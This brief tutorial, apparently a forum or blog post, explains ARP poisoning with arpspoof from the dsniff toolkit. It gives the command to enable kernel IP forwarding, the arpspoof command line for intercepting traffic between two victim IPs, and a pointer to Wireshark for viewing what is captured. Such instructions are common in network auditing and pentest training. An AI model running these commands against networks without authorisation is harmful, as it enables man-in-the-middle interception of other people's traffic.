dsniff is a collection of tools for network auduting and pentesting which includes arpspoof which does arp poisoning.

firstly you have to allow linux kernel ip forwarding, allowing a linux box to be a router essentially.

# echo 1 > /proc/sys/net/ipv4/ip_forward

then run 

arpspoof -i <interface> -t <target> -r <host>
-i : nic you want to use eth0 or tap0 etc.
target and host are the victims ip's. eg to intercept traffic from 192.168.4.11 going to 192.168.4.16 the target is .11 and host -r is .16
you can then view the traffic with wireshark or other tool
